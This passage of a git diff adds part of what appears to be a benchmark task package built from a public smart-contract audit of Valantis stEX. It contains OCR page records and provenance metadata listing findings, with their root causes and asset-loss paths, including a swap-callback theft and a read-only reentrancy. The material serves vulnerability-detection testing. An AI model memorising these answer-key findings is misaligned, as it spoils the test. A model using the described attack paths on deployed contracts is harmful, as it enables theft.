++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>text [70, 57, 915, 123]<|/det|>As such, a user can perform a swap inside of the receive callback, when the ratio of token0/token1 is significantly lower than normal, and get less swap fees as a result.\n<|det|>text [71, 136, 783, 181]<|/det|>The reentrancy guard of STEXAMM won't be triggered, because getLiquidityQuote is view and not marked as nonReentrant.\n<|det|>text [73, 196, 927, 751]<|/det|>function withdraw(\n    uint256 _shares,\n    uint256 _amountMin,\n    uint256 _amount1Min,\n    uint256 _deadline,\n    address _recipient,\n    bool _unwrapToNativeToken,\n    bool _isInstantWithdrawal\n) external override nonReentrant returns (uint256 amount0, uint256 amount1) {\n    [...]\n    if (cache.amount1LendingPool > 0) {\n    _withdrawalModule.withdrawToken1FromLendingPool(\n    cache.amount1LendingPool, _unwrapToNativeToken ? address(this) : _recipient\n    );\n    if (_unwrapToNativeToken) {\n    IWETH9(token1).withdraw(cache.amount1LendingPool);\n    Address.sendValue(payable(_recipient), cache.amount1LendingPool);\n    }\n    }\n    [...]\n}\n<|det|>page_number [910, 955, 937, 970]<|/det|>27\n", "page_image_sha256": "5fdcd35b220508a23079c0e604fdb9c768b1a450034962c1fa04de88ec44dd32", "page_number": 27, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>text [70, 57, 915, 123]<|/det|>As such, a user can perform a swap inside of the receive callback, when the ratio of token0/token1 is significantly lower than normal, and get less swap fees as a result.\n<|det|>text [71, 136, 783, 181]<|/det|>The reentrancy guard of STEXAMM won't be triggered, because getLiquidityQuote is view and not marked as nonReentrant.\n<|det|>text [73, 196, 927, 751]<|/det|>function withdraw(\n    uint256 _shares,\n    uint256 _amountMin,\n    uint256 _amount1Min,\n    uint256 _deadline,\n    address _recipient,\n    bool _unwrapToNativeToken,\n    bool _isInstantWithdrawal\n) external override nonReentrant returns (uint256 amount0, uint256 amount1) {\n    [...]\n    if (cache.amount1LendingPool > 0) {\n    _withdrawalModule.withdrawToken1FromLendingPool(\n    cache.amount1LendingPool, _unwrapToNativeToken ? address(this) : _recipient\n    );\n    if (_unwrapToNativeToken) {\n    IWETH9(token1).withdraw(cache.amount1LendingPool);\n    Address.sendValue(payable(_recipient), cache.amount1LendingPool);\n    }\n    }\n    [...]\n}\n<|det|>page_number [910, 955, 937, 970]<|/det|>27\n", "page_image_sha256": "5fdcd35b220508a23079c0e604fdb9c768b1a450034962c1fa04de88ec44dd32", "page_number": 27, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0025_0028.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 443.989}, "timing_ms": {"decode": 732, "sglang_total": 943, "ttft": 210}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 325, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 603}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0025_0028.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1107}
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/scope.pages.jsonl b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/scope.pages.jsonl
+new file mode 100644
+index 0000000..a77115d
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/scope.pages.jsonl
+@@ -0,0 +1 @@
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>header [72, 63, 287, 93]<|/det|>SCOPE\n<|det|>text [71, 135, 522, 155]<|/det|>The analyzed resources are located on:\n<|det|>text [74, 163, 593, 182]<|/det|>https://github.com/ValantisLabs/valantis-steX/\n<|det|>text [74, 185, 645, 201]<|/det|>tree/25a19b663f86b53112a5e020c843904a571cc1e8\n<|det|>text [71, 269, 848, 289]<|/det|>The issues described in this report were fixed in the following commit:\n<|det|>text [74, 298, 593, 316]<|/det|>https://github.com/ValantisLabs/valantis-steX/\n<|det|>text [74, 319, 645, 336]<|/det|>tree/95122c7693f9516385aef330ef36bb1cece2cb94\n<|det|>page_number [915, 955, 931, 970]<|/det|>5\n", "page_image_sha256": "2b1e01ad6db51f71a1e5cc8c1a3906e85c644b843c52125b91adaf8447be383b", "page_number": 5, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>header [72, 63, 287, 93]<|/det|>SCOPE\n<|det|>text [71, 135, 522, 155]<|/det|>The analyzed resources are located on:\n<|det|>text [74, 163, 593, 182]<|/det|>https://github.com/ValantisLabs/valantis-steX/\n<|det|>text [74, 185, 645, 201]<|/det|>tree/25a19b663f86b53112a5e020c843904a571cc1e8\n<|det|>text [71, 269, 848, 289]<|/det|>The issues described in this report were fixed in the following commit:\n<|det|>text [74, 298, 593, 316]<|/det|>https://github.com/ValantisLabs/valantis-steX/\n<|det|>text [74, 319, 645, 336]<|/det|>tree/95122c7693f9516385aef330ef36bb1cece2cb94\n<|det|>page_number [915, 955, 931, 970]<|/det|>5\n", "page_image_sha256": "2b1e01ad6db51f71a1e5cc8c1a3906e85c644b843c52125b91adaf8447be383b", "page_number": 5, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0005_0008.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 453.831}, "timing_ms": {"decode": 509, "sglang_total": 708, "ttft": 198}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 231, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 509}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0005_0008.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 631}
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/provenance.json b/project/evmbench/audits/2025-03-valantis-stex/provenance.json
+new file mode 100644
+index 0000000..260d927
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/provenance.json
+@@ -0,0 +1,460 @@
++{
++  "schema_version": "ocr_to_evmbench_harbor.candidate_provenance.v1",
++  "candidate_id": "2025-03-valantis-stex",
++  "materialized_at": "2026-07-25T13:13:50Z",
++  "revised_at": "2026-07-27T10:37:10Z",
++  "phase": "P11",
++  "candidate_revision": {
++    "reason": "P6 rejected the original full-clone image because post-audit fix history and 19 dependency audit PDFs were agent-visible.",
++    "authorized_by": "Explicit user approval of Phase P5R candidate Dockerfile remediation and Phase P6 rerun on 2026-07-25.",
++    "scope": [
++      "Replace the full clone with a depth-one fetch of only the vulnerable commit.",
++      "Verify all 14 reviewed recursive submodule revisions.",
++      "Remove dependency PDFs and nested submodule Git metadata in the clone layer.",
++      "Preserve the unapproved review state and all finding evidence."
++    ]
++  },
++  "base_image_revision": {
++    "reason": "Replace the mutable evmbench/base:latest build input with the exact reviewed base image published by digest.",
++    "authorized_by": "User instruction on 2026-07-27 to publish images to Docker Hub repository pranay5255/yudaii_evmbench.",
++    "reviewer_identity": "https://github.com/pranay5255",
++    "registry_tag": "docker.io/pranay5255/yudaii_evmbench:base-fc20d776501708f9-amd64",
++    "registry_digest": "sha256:745a1f8d9c49a855f02d0a7254e902f139f4d385a889d1815d699ab05c16c1a0",
++    "immutable_reference": "docker.io/pranay5255/yudaii_evmbench@sha256:745a1f8d9c49a855f02d0a7254e902f139f4d385a889d1815d699ab05c16c1a0",
++    "image_config_digest": "sha256:fc20d776501708f9236e87b0e853d03f66d3b75af41a9ab1d1aad2c8b2c72fb9",
++    "platform": "linux/amd64",
++    "manifest_verified": true
++  },
++  "task_identity": {
++    "task_group_key": "ValantisLabs/valantis-stex@25a19b663f86b53112a5e020c843904a571cc1e8|src/**|detect",
++    "task_group_key_sha256": "9f59eac69f7a44cd5049f206652168cc70c46183df51fa33a923c94b2b6f2f3c",
++    "repository_slug": "ValantisLabs/valantis-stex",
++    "vulnerable_commit": "25a19b663f86b53112a5e020c843904a571cc1e8",
++    "audited_scope": "src/**",
++    "mode": "detect",
++    "framework": "foundry"
++  },
++  "source_pdf": {
++    "pdf_id": "pdf_002911_39a2c2ee71c9",
++    "source_bucket": "other_audit_repo_pdfs",
++    "source_filename": "valantis-mar-25(Final).pdf",
++    "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf",
++    "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf",
++    "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7",
++    "size_bytes": 13601799,
++    "physical_page_count": 38,
++    "readable": true,
++    "encrypted": false,
++    "copied_into_candidate": false
++  },
++  "source_ocr": {
++    "schema_version": "evmbench_task_creation.ocr_page.v1",
++    "path": "/home/experiments_base/OPD_base/outputs/evmbench_task_batch/extracted_pages/pdf_002911_39a2c2ee71c9.jsonl",
++    "sha256": "10dc7a85ff63d44fab604ffdcec2f47b22ad8abcdfea1973a553ff5c88f0268d",
++    "size_bytes": 186206,
++    "record_count": 38,
++    "source_page_count": 38,
++    "created_at": "2026-07-01T17:46:49.843216+00:00",
++    "ocr_backend": "sglang",
++    "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1",
++    "ocr_model": "Unlimited-OCR",
++    "ocr_model_version": "Unlimited-OCR",
++    "immutable_input": true
++  },
++  "repository_match": {
++    "repository_url": "https://github.com/ValantisLabs/valantis-stex",
++    "repository_slug": "ValantisLabs/valantis-stex",
++    "commit": "25a19b663f86b53112a5e020c843904a571cc1e8",
++    "root_tree": "01a3298cb0d49d695a9832359ffa7658b8e140ae",
++    "src_tree": "05bfac7670a56c7c2d44d99f7463ca550477678f",
++    "detached_head": true,
++    "clean_including_submodules": true,
++    "review_clone": "/tmp/valantis-ocr-harbor.iZKXoT/p4-review.9tCIDp/repo"
++  },
++  "fixed_snapshot": {
++    "commit": "95122c7693f9516385aef330ef36bb1ccec2cb94",
++    "root_tree": "ee3f91fd4e34b57a381ceb11746f7e5a43578ef5",
++    "vulnerable_commit_is_ancestor": true,
++    "kept_separate_from_vulnerable_task_snapshot": true
++  },
++  "tooling_revisions": {
++    "opd_base": {
++      "revision": "38957485d5cd63dc5d664c3c2993f60b308f5776",
++      "isolated_clone": "/tmp/valantis-ocr-harbor.iZKXoT/opd-base",
++      "clean": true
++    },
++    "forest_of_audits": {
++      "revision": "1db91e36ec6f7c5975a8779b6ad930503c23e9d4",
++      "isolated_clone": "/tmp/valantis-ocr-harbor.iZKXoT/forest-of-audits",
++      "clean_before_admission": true,
++      "worktree_contains_isolated_admission": true
++    },
++    "harbor": {
++      "version": "0.20.0",
++      "wheel_sha256": "4b7e48223aea2384cdb8c9eff35eaebd482fc9b1ec09f8193a121c47356ff19a",
++      "task_schema": "1.3",
++      "task_path": "/tmp/valantis-harbor-dataset.Vrdzx8/evmbench__detect-2025-03-valantis-stex",
++      "loader_passed": true
++    }
++  },
++  "base_image": {
++    "source_tag": "docker.io/pranay5255/yudaii_evmbench:base-fc20d776501708f9-amd64",
++    "source_digest": "sha256:745a1f8d9c49a855f02d0a7254e902f139f4d385a889d1815d699ab05c16c1a0",
++    "immutable_reference": "docker.io/pranay5255/yudaii_evmbench@sha256:745a1f8d9c49a855f02d0a7254e902f139f4d385a889d1815d699ab05c16c1a0",
++    "image_config_digest": "sha256:fc20d776501708f9236e87b0e853d03f66d3b75af41a9ab1d1aad2c8b2c72fb9",
++    "platform": "linux/amd64"
++  },
++  "agent_image": {
++    "source_tag": "docker.io/pranay5255/yudaii_evmbench:2025-03-valantis-stex-agent-d21ecebec4083ea5-amd64",
++    "source_digest": "sha256:a24989c61134ccfed57c61c5a978b1e871fed2c75202039899f267688fc20f44",
++    "immutable_reference": "docker.io/pranay5255/yudaii_evmbench@sha256:a24989c61134ccfed57c61c5a978b1e871fed2c75202039899f267688fc20f44",
++    "image_config_digest": "sha256:d21ecebec4083ea50db60dbcfceecb783dca553e4385724d9c2c2c9e5a089f71",
++    "platform": "linux/amd64",
++    "manifest_verified": true,
++    "foundry_offline_build_passed": true,
++    "foundry_tests": {
++      "passed": 34,
++      "failed": 0,
++      "skipped": 0
++    },
++    "leakage_scan_passed": true
++  },
++  "verifier_image": {
++    "source_tag": "docker.io/pranay5255/yudaii_evmbench:2025-03-valantis-stex-verifier-p9",
++    "source_digest": "sha256:f6ad584c2fc82c2baea6ebc290da0074d1073f70bf131a968ccc967052622112",
++    "immutable_reference": "docker.io/pranay5255/yudaii_evmbench@sha256:f6ad584c2fc82c2baea6ebc290da0074d1073f70bf131a968ccc967052622112",
++    "image_config_digest": "sha256:2d3af791f5f14762b3e651abc85ac013fb20855696b36c04508ca8d0017fa20b",
++    "platform": "linux/amd64",
++    "manifest_verified": true,
++    "separate_environment": true,
++    "credential_layers_absent": true,
++    "leakage_scan_passed": true
++  },
++  "submodules": [
++    {"path": "lib/forge-std", "url": "https://github.com/foundry-rs/forge-std", "revision": "b93cf4bc34ff214c099dc970b153f85ade8c9f66"},
++    {"path": "lib/openzeppelin-contracts", "url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "revision": "acd4ff74de833399287ed6b31b4debf6b2b35527"},
++    {"path": "lib/openzeppelin-contracts/lib/erc4626-tests", "url": "https://github.com/a16z/erc4626-tests.git", "revision": "8b1d7c2ac248c33c3506b1bff8321758943c5e11"},
++    {"path": "lib/openzeppelin-contracts/lib/forge-std", "url": "https://github.com/foundry-rs/forge-std", "revision": "8f24d6b04c92975e0795b5868aa0d783251cdeaa"},
++    {"path": "lib/openzeppelin-contracts/lib/halmos-cheatcodes", "url": "https://github.com/a16z/halmos-cheatcodes", "revision": "c0d865508c0fee0a11b97732c5e90f9cad6b65a5"},
++    {"path": "lib/solmate", "url": "https://github.com/transmissions11/solmate", "revision": "c93f7716c9909175d45f6ef80a34a650e2d24e56"},
++    {"path": "lib/solmate/lib/ds-test", "url": "https://github.com/dapphub/ds-test", "revision": "e282159d5170298eb2455a6c05280ab5a73a4ef0"},
++    {"path": "lib/valantis-core", "url": "https://github.com/ValantisLabs/valantis-core", "revision": "18ee8bb9ad91871ddfdb711f0522f15d89e03673"},
++    {"path": "lib/valantis-core/lib/forge-std", "url": "https://github.com/foundry-rs/forge-std", "revision": "2f112697506eab12d433a65fdc31a639548fe365"},
++    {"path": "lib/valantis-core/lib/forge-std/lib/ds-test", "url": "https://github.com/dapphub/ds-test", "revision": "e282159d5170298eb2455a6c05280ab5a73a4ef0"},
++    {"path": "lib/valantis-core/lib/openzeppelin-contracts", "url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "revision": "281550b71c3df9a83e6b80ceefc700852c287570"},
++    {"path": "lib/valantis-core/lib/openzeppelin-contracts/lib/erc4626-tests", "url": "https://github.com/a16z/erc4626-tests.git", "revision": "8b1d7c2ac248c33c3506b1bff8321758943c5e11"},
++    {"path": "lib/valantis-core/lib/openzeppelin-contracts/lib/forge-std", "url": "https://github.com/foundry-rs/forge-std", "revision": "c2236853aadb8e2d9909bbecdc490099519b70a4"},
++    {"path": "lib/valantis-core/lib/openzeppelin-contracts/lib/forge-std/lib/ds-test", "url": "https://github.com/dapphub/ds-test", "revision": "6da7dd8f7395f83e1fb6fa88a64ba9a030f85d4f"}
++  ],
++  "ocr_evidence": [
++    {"page_number": 5, "role": "scope", "page_image_sha256": "2b1e01ad6db51f71a1e5cc8c1a3906e85c644b843c52125b91adaf8447be383b", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/scope.pages.jsonl"},
++    {"page_number": 10, "finding_id": "H-01", "page_image_sha256": "69e0fd4ae4e2a20159c8b5e0e86b1e9055fd07629858e744571c94dc5a4345bc", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-01.pages.jsonl"},
++    {"page_number": 11, "finding_id": "H-01", "page_image_sha256": "b5b34fd50d2fe1267660651e13fba6be5ff70d963157943bf6dab41139bfddff", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-01.pages.jsonl"},
++    {"page_number": 12, "finding_id": "H-01", "page_image_sha256": "c3fe88e666a2f50ad08959b6e91d10f1045c7f61e88ac5fc21fb36f1b6b39cf1", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-01.pages.jsonl"},
++    {"page_number": 13, "finding_id": "H-02", "page_image_sha256": "18fe679a18d9ae4f4b6bea4c4fd3c520ca509db2b6f7d12fccdac265a20fd861", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-02.pages.jsonl"},
++    {"page_number": 14, "finding_id": "H-02", "page_image_sha256": "64650b541f7624a7c2e49dc3f66203bb1d8fc929b39ec7e444b04b17311000e4", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-02.pages.jsonl"},
++    {"page_number": 15, "finding_id": "H-02", "page_image_sha256": "0d779a79d8df9931a4c27c2e28b4cfb164abacef3a43753817d89819e1fbceed", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-02.pages.jsonl"},
++    {"page_number": 16, "finding_id": "H-02", "page_image_sha256": "a8d79859f0dd76dfd61823c321aefd12c639c918c17009195d61fa87b9e1d3c3", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-02.pages.jsonl"},
++    {"page_number": 17, "finding_id": "H-02", "page_image_sha256": "c76d2c4a9d5d167101cb97535bbad8de00f4e24014ca12179aeabf3b10e10f0b", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-02.pages.jsonl"},
++    {"page_number": 18, "finding_id": "H-02", "page_image_sha256": "e9294cbeb0e1aa1745023856fb6c75bb5e03681688f01cbd2920708f46b89d2e", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-02.pages.jsonl"},
++    {"page_number": 19, "finding_id": "H-03", "page_image_sha256": "351e8ba5c5a2bf35bd3a09bd73994b8efa65741dc4f1af870d5e8a62710a1854", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-03.pages.jsonl"},
++    {"page_number": 20, "finding_id": "H-03", "page_image_sha256": "0f3477c2110eaf2f92113e7b1eef8a858fbaf6f9581eedd3a9a21fa92b3acc46", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-03.pages.jsonl"},
++    {"page_number": 21, "finding_id": "H-04", "page_image_sha256": "51627636f7c315eae84fa175ce4d940a73dbec5687d29bc8ae01def75ba77e9c", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-04.pages.jsonl"},
++    {"page_number": 22, "finding_id": "H-04", "page_image_sha256": "569666f170d3d0182a431d8366a8b549c4903b1bd4c1c36db15b7a7cd94f2494", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-04.pages.jsonl"},
++    {"page_number": 23, "finding_id": "H-04", "page_image_sha256": "a3c130b08f0f50dd0f9458581579efb0d2b5f6b3bf10776205353b8226d2c217", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-04.pages.jsonl"},
++    {"page_number": 24, "finding_id": "H-04", "page_image_sha256": "a22d5d4b2092ea857508750acaf8a8c4a6fc9fecccc8c312de3b62f706d8c499", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-04.pages.jsonl"},
++    {"page_number": 25, "finding_id": "H-04", "page_image_sha256": "8b43bd5f0ace32d9e6f68aafb95fae275f4c78a5b8325dff75abcfc7557bd016", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-04.pages.jsonl"},
++    {"page_number": 26, "finding_id": "H-05", "page_image_sha256": "18722b210342973fa8e1ae2f6ca321656e55a7a82e66ba22e386c908d2d03d10", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-05.pages.jsonl"},
++    {"page_number": 27, "finding_id": "H-05", "page_image_sha256": "5fdcd35b220508a23079c0e604fdb9c768b1a450034962c1fa04de88ec44dd32", "artifact_ref": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-05.pages.jsonl"}
++  ],
++  "selected_findings": [
++    {
++      "finding_id": "H-01",
++      "report_id": "VLTS3-5",
++      "pages": [10, 11, 12],
++      "title": "Stale pending-withdrawal accounting misprices LP shares",
++      "grounded_impact": "Stale pending-withdrawal accounting misprices deposits and withdrawals and costs users shares.",
++      "generated_file": "findings/H-01.md"
++    },
++    {
++      "finding_id": "H-02",
++      "report_id": "VLTS3-13",
++      "pages": [13, 14, 15, 16, 17, 18],
++      "title": "Swap callback can steal unstaking surplus",
++      "grounded_impact": "Calling update during a swap callback lets an attacker treat surplus HYPE as payment and steal pool value.",
++      "generated_file": "findings/H-02.md"
++    },
++    {
++      "finding_id": "H-03",
++      "report_id": "VLTS3-3",
++      "pages": [19, 20],
++      "title": "Lending-module migration strands withdrawn token1",
++      "grounded_impact": "Changing lending modules strands withdrawn assets in the withdrawal module.",
++      "generated_file": "findings/H-03.md"
++    },
++    {
++      "finding_id": "H-04",
++      "report_id": "VLTS3-9",
++      "pages": [21, 22, 23, 24, 25],
++      "title": "Withdrawal checkpoints let later claims bypass FIFO",
++      "grounded_impact": "Incorrect checkpoints let later withdrawals bypass FIFO and consume liquidity owed to earlier users.",
++      "generated_file": "findings/H-04.md"
++    },
++    {
++      "finding_id": "H-05",
++      "report_id": "VLTS3-14",
++      "pages": [26, 27],
++      "title": "Withdrawal read-only reentrancy discounts swap fees",
++      "grounded_impact": "Read-only reentrancy exposes an intermediate reserve ratio and discounts swap fees, leaking protocol revenue.",
++      "generated_file": "findings/H-05.md"
++    }
++  ],
++  "report_dispositions": [
++    {
++      "report_id": "VLTS3-5",
++      "pages": [10, 11, 12],
++      "reported_severity": "Critical",
++      "disposition": "included",
++      "finding_id": "H-01",
++      "affected_paths": ["src/STEXAMM.sol", "src/stHYPEWithdrawalModule.sol"],
++      "root_cause": "Pending token1 withdrawal storage remains stale after native HYPE arrives while the token0 pending getter nets the new balance immediately.",
++      "asset_loss_path": "Inconsistent total-assets accounting over-mints or underpays LP shares, transferring value between LP cohorts.",
++      "corroborating_fix_commit": "320fd6d3789f94a5bccd06d14c2f936d44f919fc"
++    },
++    {
++      "report_id": "VLTS3-13",
++      "pages": [13, 14, 15, 16, 17, 18],
++      "reported_severity": "Critical",
++      "disposition": "included",
++      "finding_id": "H-02",
++      "affected_paths": ["src/stHYPEWithdrawalModule.sol", "lib/valantis-core/src/pools/SovereignPool.sol"],
++      "root_cause": "Public update can transfer surplus token1 to the Sovereign Pool while its swap callback is measuring attacker payment.",
++      "asset_loss_path": "The pool counts protocol surplus as attacker input and releases token0 without attacker-funded payment.",
++      "corroborating_fix_commit": "efd1019ab0ee193c2a4b9c85b4aaa7ec4db74aec"
++    },
++    {
++      "report_id": "VLTS3-3",
++      "pages": [19, 20],
++      "reported_severity": "High",
++      "disposition": "included",
++      "finding_id": "H-03",
++      "affected_paths": ["src/stHYPEWithdrawalModule.sol"],
++      "root_cause": "Lending-module migration withdraws pool token1 to the withdrawal module, then replaces the module without returning or redepositing that balance.",
++      "asset_loss_path": "Pool-owned token1 is stranded outside reserve and lending accounting and cannot serve withdrawals.",
++      "corroborating_fix_commit": "b0ba237d9f972f3d74691d5ca42090887e49a556"
++    },
++    {
++      "report_id": "VLTS3-9",
++      "pages": [21, 22, 23, 24, 25],
++      "reported_severity": "High",
++      "disposition": "included",
++      "finding_id": "H-04",
++      "affected_paths": ["src/stHYPEWithdrawalModule.sol", "src/structs/WithdrawalModuleStructs.sol"],
++      "root_cause": "Requests checkpoint cumulative fulfilled liquidity rather than cumulative queued obligations.",
++      "asset_loss_path": "A later small request can consume claimable HYPE owed by an earlier large request.",
++      "corroborating_fix_commit": "5115be75eb0f8dcb8bda9040f1cf0184cfbc9f5c"
++    },
++    {
++      "report_id": "VLTS3-14",
++      "pages": [26, 27],
++      "reported_severity": "Medium",
++      "disposition": "included",
++      "finding_id": "H-05",
++      "affected_paths": ["src/STEXAMM.sol", "src/STEXRatioSwapFeeModule.sol", "lib/valantis-core/src/pools/SovereignPool.sol"],
++      "root_cause": "A withdrawal recipient can reenter a view quote path while reserves and pending liabilities reflect an intermediate withdrawal state.",
++      "asset_loss_path": "The temporary reserve ratio selects a lower swap fee and leaks protocol or pool-manager fee revenue.",
++      "corroborating_fix_commit": "3020c02c170d9668b3e0a5ffb79d75fc4837e9e2"
++    },
++    {
++      "report_id": "VLTS3-7",
++      "pages": [28, 29],
++      "reported_severity": "Low",
++      "disposition": "excluded",
++      "reason_category": "availability_only",
++      "reason": "A zero-balance migration can revert, blocking that owner operation until code or configuration changes, but it does not transfer or destroy assets and establishes no unprivileged asset-loss path."
++    },
++    {
++      "report_id": "VLTS3-10",
++      "pages": [30, 31],
++      "reported_severity": "Low",
++      "disposition": "excluded",
++      "reason_category": "privileged_design",
++      "reason": "The report assumes a malicious or compromised fee owner exercising an explicit administration capability; no separate unprivileged bug or accepted detect-mode asset-loss path is established."
++    },
++    {
++      "report_id": "VLTS3-11",
++      "pages": [32, 33],
++      "reported_severity": "Low",
++      "disposition": "excluded",
++      "reason_category": "availability_and_privileged_design",
++      "reason": "The described consequence is temporary withdrawal unavailability caused by external Aave utilization and an owner-controlled allocation choice, not an independent theft, destruction, or permanent loss mechanism."
++    },
++    {
++      "report_id": "VLTS3-2",
++      "pages": [34],
++      "reported_severity": "Informational",
++      "disposition": "excluded",
++      "reason_category": "informational_best_practice",
++      "reason": "Two-step ownership transfer is a hardening recommendation for operator mistakes, not a presently exploitable asset-loss bug."
++    },
++    {
++      "report_id": "VLTS3-4",
++      "pages": [35],
++      "reported_severity": "Informational",
++      "disposition": "excluded",
++      "reason_category": "informational_dead_code",
++      "reason": "Unused error declarations do not alter execution or asset accounting."
++    },
++    {
++      "report_id": "VLTS3-12",
++      "pages": [36, 37],
++      "reported_severity": "Informational",
++      "disposition": "excluded",
++      "reason_category": "informational_simplification",
++      "reason": "The conditional and direct assignment are behaviorally equivalent and create no security impact."
++    }
++  ],
++  "ocr_corrections": [
++    {
++      "page": 5,
++      "field": "repository_url",
++      "ocr_value": "https://github.com/ValantisLabs/valantis-steX/",
++      "corrected_value": "https://github.com/ValantisLabs/valantis-stex/",
++      "pdf_confirmed": true,
++      "git_confirmed": true
++    },
++    {
++      "page": 5,
++      "field": "fixed_commit",
++      "ocr_value": "95122c7693f9516385aef330ef36bb1cece2cb94",
++      "corrected_value": "95122c7693f9516385aef330ef36bb1ccec2cb94",
++      "pdf_confirmed": true,
++      "git_confirmed": true
++    },
++    {
++      "page": 10,
++      "field": "report_id",
++      "ocr_value": "VLTS3-S",
++      "corrected_value": "VLTS3-5",
++      "pdf_confirmed": true,
